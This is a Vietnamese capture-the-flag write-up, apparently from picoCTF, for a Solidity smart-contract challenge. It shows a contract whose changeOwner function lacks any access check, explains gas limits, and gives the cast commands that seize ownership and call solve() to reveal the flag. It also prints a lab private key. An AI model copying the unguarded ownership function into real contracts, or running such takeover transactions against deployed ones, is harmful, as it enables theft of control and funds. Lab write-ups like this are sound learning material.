# Access\_Control

Contract

```
pragma solidity ^0.8.0;

contract AccessControl {
    address public owner;
    string private flag;
    
    bool public revealed;

    event OwnerChanged(address indexed oldOwner, address indexed newOwner);
    event FlagRevealed(string flag);

    constructor(string memory _flag) {
        owner = msg.sender;
        flag = _flag;
        revealed = false;
    }

    function changeOwner(address _newOwner) public {
        address oldOwner = owner;
        owner = _newOwner;
        emit OwnerChanged(oldOwner, _newOwner);
    }

    function solve() public {
        require(msg.sender == owner, "Only the owner can get the flag.");
        
        if (!revealed) {
            revealed = true;
            emit FlagRevealed(flag);
        }
    }

    function getFlag() public view returns (string memory) {
        require(revealed, "Challenge not yet solved!");
        return flag;
    }
}
```

#### Thông tin quan trọng từ giao diện

* **Contract Address:** `0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9`
* **Private Key của bạn:** `0x2176430015f60ccbe0bbf7b46d2785fe4061554d432b459938beec6f7a963faa`
* **Địa chỉ ví của bạn:** `0xd3d59Cc5A4014D85F6FE17031196DeBE4fF56e02`
* **Gas Balance:** 5 ETH
* **RPC Node:** `http://lonely-island.picoctf.net:64276`

#### Phân tích&#x20;

* Hợp đồng có biến **owner** và flag private.
* Hàm **changeOwner** không có kiểm tra → ai cũng gọi được. -> kết hợp hint cta sẽ chiếm quyền owner để giải bài
* Hàm **solve** chỉ cho phép **owner** gọi.
* Sau khi gọi **solve**, flag được reveal và có thể đọc qua **getFlag**

#### Gas Limit là gì?

Trong Ethereum, mỗi thao tác tính toán đều tiêu tốn một lượng **gas**. Khi gửi giao dịch, ta phải đặt **gas limit** – tức là số gas tối đa mà giao dịch được phép dùng.

* Nếu giao dịch cần ít hơn gas limit, phần dư sẽ được hoàn trả.
* Nếu giao dịch cần nhiều hơn mà gas limit đặt quá thấp, giao dịch sẽ bị lỗi “out of gas”.
* Gas price là chi phí cho mỗi đơn vị gas, còn tổng chi phí thực tế = gas used × gas price.

#### Ví dụ trong challenge

* Hàm `changeOwner` thực tế dùng khoảng **28k gas**.
* Hàm `solve()` dùng khoảng **52k gas**.
* Khi khai thác, mình đặt `--gas-limit 1000000` để chắc chắn giao dịch không bị thiếu gas. Dù đặt cao, thực tế chỉ số gas dùng mới quyết định chi phí.

Để chắc chắn RPC đang hoạt động, ta kiểm tra trước nếu trả về số block thì ta tiếp tục tiến hành

```
cast block-number --rpc-url http://lonely-island.picoctf.net:<port>
```

ta tiến hành chiếm quyền **owner**

```
cast send 0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9 \
"changeOwner(address)" 0x<địa_chỉ_của_bạn> \
--rpc-url http://lonely-island.picoctf.net:<port> \
--private-key 0x<private_key_của_bạn> \
--legacy --gas-limit 1000000 --gas-price 1000000000

```

<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Transaction thành công, log sự kiện **OwnerChanged** xác nhận bạn đã là owner và địa chỉ ví mới là ví của bạn

sau đó ta gọi **solve** (được viết với điều kiện chỉ cho phép **owner** gọi và thành công sẽ ra **FlagRevealed)**

```
cast send 0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9 \
"solve()" \
--rpc-url http://lonely-island.picoctf.net:64276 \
--private-key 0x<private_key_của_bạn> \
--legacy --gas-limit 1000000 --gas-price 1000000000
```

<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Transaction thành công, và ở bên dịch vụ web, flag đã được tiết lộ

<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
